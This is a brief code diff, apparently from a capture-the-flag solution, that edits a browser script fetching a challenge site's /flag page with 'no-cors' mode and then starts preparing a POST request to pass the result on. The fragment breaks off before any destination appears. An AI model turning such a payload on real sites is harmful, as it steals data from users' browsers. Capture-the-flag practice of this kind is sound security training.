@@ -1,4 +1,6 @@
-fetch("https://hallmark.web.actf.co/flag").then(function(a) {
+fetch("https://hallmark.web.actf.co/flag",{
+            "mode": "no-cors"
+        }).then(function(a) {
     a.text().then(owo => {
       const options = {
       method: "POST",
